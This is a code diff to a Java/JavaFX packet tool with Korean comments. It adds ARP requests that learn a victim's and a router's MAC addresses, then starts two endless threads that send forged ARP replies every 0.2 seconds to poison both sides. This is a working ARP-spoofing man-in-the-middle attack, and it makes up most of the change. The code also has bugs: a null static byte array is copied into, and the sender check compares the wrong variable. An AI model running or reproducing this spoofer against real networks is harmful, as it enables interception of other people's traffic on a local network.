@@ -15,6 +15,7 @@ import org.jnetpcap.packet.JRegistry;
 import org.jnetpcap.packet.PcapPacket;
 import org.jnetpcap.protocol.lan.Ethernet;
 
+import javafx.application.Platform;
 import javafx.collections.FXCollections;
 import javafx.collections.ObservableList;
 import javafx.fxml.FXML;
@@ -28,6 +29,8 @@ import model.Util;
 
 public class Controller implements Initializable{
 	
+	private static final byte[] sourceIP = null;
+
 	@FXML
 	private ListView<String> networkListView;
 	
@@ -139,13 +142,21 @@ public class Controller implements Initializable{
 		textArea.appendText("타겟에게 ARP Request를 보냈습니다.\n"+ 
 				Util.bytesToString(arp.getPacket())+"\n");
 		
-		
+		//현재 시간을 볼 수 있도록 하는 작업.
+		long targetStartTime = System.currentTimeMillis();
 		
 		//    [여기부터 reply 구현]
 		
 		
 		Main.targetMAC = new byte[6]; //targetMAC을 초기화해서 맥주소를 담을 수 있게 함.
 		while(Main.pcap.nextEx(header,buf) != Pcap.NEXT_EX_NOT_OK) {
+			
+			if(System.currentTimeMillis() - targetStartTime >= 500) {
+				//0.5초 정도 시간이 흐르면 오류 뜨게 설정.
+				textArea.appendText("타겟이 응답하지 않습니다.\n");
+				return; //break 면 다시, return 이면 시스템 종료
+			}
+			
 			//패킷을 캡쳐하는데 오류가 발생하지않으면
 			PcapPacket packet = new PcapPacket(header,buf);
 			packet.scan(id);
@@ -154,7 +165,7 @@ public class Controller implements Initializable{
 			System.arraycopy(packet.getByteArray(0, packet.size()), 28, sourceIP, 0, 4);
 			if (packet.getByte(12)== 0x08 && packet.getByte(13)== 0x06 
 					&& packet.getByte(20)== 0x00 
-					&& packet.getByte(22)==0x02 
+					&& packet.getByte(21)==0x02 
 					&& Util.bytesToString(sourceIP).equals(Util.bytesToString(Main.targetIP))
 							&& packet.hasHeader(eth)) { //arp 패킷인지 확인하는 작업
 				//arp는 0806이었음
@@ -173,8 +184,118 @@ public class Controller implements Initializable{
 		
 		
 		
+		arp = new ARP();
+		arp.makeARPRequest(Main.myMAC, Main.myIP, Main.senderIP);
+		buffer = ByteBuffer.wrap(arp.getPacket());
+		if (Main.pcap.sendPacket(buffer) != Pcap.OK) {
+			System.out.println(Main.pcap.getErr());
+		}
 		
+		textArea.appendText("센더에게 ARP Request를 보냈습니다.\n"+ 
+				Util.bytesToString(arp.getPacket())+"\n");
+		
+		
+		
+
+		long senderStartTime = System.currentTimeMillis();
+		
+		Main.senderMAC = new byte[6]; //targetMAC을 초기화해서 맥주소를 담을 수 있게 함.
+		while(Main.pcap.nextEx(header,buf) != Pcap.NEXT_EX_NOT_OK) {
+			//패킷을 캡쳐하는데 오류가 발생하지않으면
+			
+			if(System.currentTimeMillis() - senderStartTime >= 500) {
+				//0.5초 정도 시간이 흐르면 오류 뜨게 설정.
+				textArea.appendText("타겟이 응답하지 않습니다.\n");
+				return;
+			}
+			
+			
+			PcapPacket packet = new PcapPacket(header,buf);
+			packet.scan(id);
+			
+			byte[] senderIP =  new byte[4]; //나한테 보낸 사람의 IP를 확인하기.
+			System.arraycopy(packet.getByteArray(0, packet.size()), 28, senderIP, 0, 4);
+			if (packet.getByte(12)== 0x08 && packet.getByte(13)== 0x06 
+					&& packet.getByte(20)== 0x00 
+					&& packet.getByte(21)==0x02 
+					&& Util.bytesToString(sourceIP).equals(Util.bytesToString(Main.senderIP))
+							&& packet.hasHeader(eth)) { //arp 패킷인지 확인하는 작업
+				//arp는 0806이었음
+				Main.senderMAC = eth.source(); //캡쳐한 패킷에 타겟의 맥주소를 넣어줌.
+				break;
+				
+			} else {
+				continue;
+			}
+		}
+		
+		textArea.appendText("센더의 맥 주소: " + 
+		Util.bytesToString(Main.senderMAC) + "\n");
+		//타겟 (공유기)한테 arp request 패킷을 보내고, 건너온 reply를 받아서 arp 패킷인지 확인한 후에
+		//얻어온 맥주소를 타겟 맥주소로 넣어주고 얻어온 맥주소를 출력해옴.
+		
+		new SenderARPSpoofing().start();
+		new TargetARPSpoofing().start();
 		
 	}
+	//어떠한 작업을 반복적으로 수행할때 사용하는 class
 	
+	class SenderARPSpoofing extends Thread{
+		@Override
+		//스레드는 run을 메인함수로써 실행하게 됨.
+		public void run() {
+			ARP arp = new ARP();
+			//sender에게 타겟의 ip(공유기ip)를 가진 맥주소는 내 맥주소라고 알려줌.
+			arp.makeARPReply(Main.senderMAC, Main.myMAC,Main.myMAC,
+					Main.targetIP,Main.senderMAC,Main.senderIP);
+			
+			
+			Platform.runLater(() -> {
+				textArea.appendText("센더에게 감염된"
+						+ "ARP Reply 패킷을"
+						+ "계속해서 전송합니다"
+						+ "\n");
+			});
+			
+			//0.2초 마다 sender(피해자)에게 변형된 arp 리플라이 패킷을 전송함.
+			while(true) {
+				ByteBuffer buffer = ByteBuffer.wrap(arp.getPacket());
+				Main.pcap.sendPacket(buffer);
+				try {
+					Thread.sleep(200); //0.2초씩
+				}catch(Exception e) {
+					e.printStackTrace();
+				}
+			}
+		}
+	}
+	class TargetARPSpoofing extends Thread{
+		@Override
+		//스레드는 run을 메인함수로써 실행하게 됨.
+		public void run() {
+			ARP arp = new ARP();
+			//sender에게 타겟의 ip(공유기ip)를 가진 맥주소는 내 맥주소라고 알려줌.
+			arp.makeARPReply(Main.targetMAC, Main.myMAC,Main.myMAC,
+					Main.senderIP,Main.targetMAC,Main.targetIP);
+			
+			
+			Platform.runLater(() -> {
+				textArea.appendText("타겟에게 감염된"
+						+ "ARP Reply 패킷을"
+						+ "계속해서 전송합니다"
+						+ "\n");
+			});
+			
+			//0.2초 마다 sender(피해자)에게 변형된 arp 리플라이 패킷을 전송함.
+			while(true) {
+				ByteBuffer buffer = ByteBuffer.wrap(arp.getPacket());
+				Main.pcap.sendPacket(buffer);
+				try {
+					Thread.sleep(200); //0.2초씩
+				}catch(Exception e) {
+					e.printStackTrace();
+				}
+			}
+		}
+	}
 }
